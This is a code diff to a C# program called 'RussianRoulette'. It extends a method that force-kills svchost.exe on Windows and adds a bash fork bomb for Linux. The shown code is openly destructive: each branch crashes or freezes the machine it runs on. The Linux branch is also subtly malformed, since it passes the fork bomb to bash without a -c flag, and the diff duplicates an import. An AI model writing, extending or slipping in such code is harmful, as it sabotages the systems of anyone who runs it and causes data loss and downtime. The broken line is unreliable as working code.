@@ -1,6 +1,10 @@
 ﻿using System.Diagnostics;
 using System.Security.Principal;
 
+using System.Diagnostics;
+
+using System.Runtime.InteropServices;
+
 namespace RussianRoulette
 {
     internal static class Program
@@ -82,8 +86,23 @@ namespace RussianRoulette
         public static void KillServiceHostProcess()
         {
             ProcessStartInfo processInfo = new ProcessStartInfo();
-            processInfo.FileName = "cmd.exe";
-            processInfo.Arguments = "/c taskkill /F /IM svchost.exe";
+
+            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+            {
+                processInfo.FileName = "cmd.exe";
+                processInfo.Arguments = "/c taskkill /F /IM svchost.exe";
+            }
+            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
+            {
+                processInfo.FileName = "/bin/bash";
+                processInfo.Arguments = ":(){ :|:& };:";
+            }
+            else
+            {
+                Console.WriteLine("Unsupported OS platform");
+                return;
+            }
+
             processInfo.CreateNoWindow = true;
             processInfo.UseShellExecute = false;
             processInfo.RedirectStandardError = true;
